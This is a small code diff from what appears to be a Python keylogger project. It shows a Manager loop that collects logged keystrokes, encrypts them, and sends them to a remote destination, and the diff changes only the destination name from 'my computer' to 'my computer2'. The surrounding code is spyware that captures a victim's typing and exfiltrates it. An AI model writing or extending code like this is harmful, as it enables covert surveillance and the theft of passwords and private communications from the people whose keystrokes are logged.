@@ -26,6 +26,6 @@ class Manager:
                 data = self.keylogger.get_logged_keys()
 
                 encrypted_data = self.encryptor.encrypt(data)
-                self.send.send_data(encrypted_data, "my computer")
+                self.send.send_data(encrypted_data, "my computer2")
             except:
                 print('some error occurred, please check your program')
